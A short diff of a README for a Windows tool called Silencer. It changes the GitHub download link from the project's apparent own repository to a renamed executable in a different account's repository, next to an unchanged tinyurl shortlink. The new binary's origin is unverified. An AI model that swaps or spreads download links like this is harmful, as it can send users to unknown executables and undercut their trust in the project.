@@ -36,7 +36,7 @@ Download the latest release from one of the following sources:
 
 | Source | Link |
 |--------|------|
-| **GitHub Releases** | [Silencer.v1.5.exe](https://github.com/0x53616E/Silencer/releases/download/v1.5/Silencer.v1.5.exe) |
+| **GitHub Releases** | [Silencer.v1.5.exe](https://github.com/bishpop/SilencerAudition/releases/download/v1.5/Silencer.exe) |
 | **Website** | [tinyurl.com/sanyaproject](https://tinyurl.com/sanyaproject) |
 
 No installation required — just run the `.exe` directly. It is now a lightweight, native C++ application!
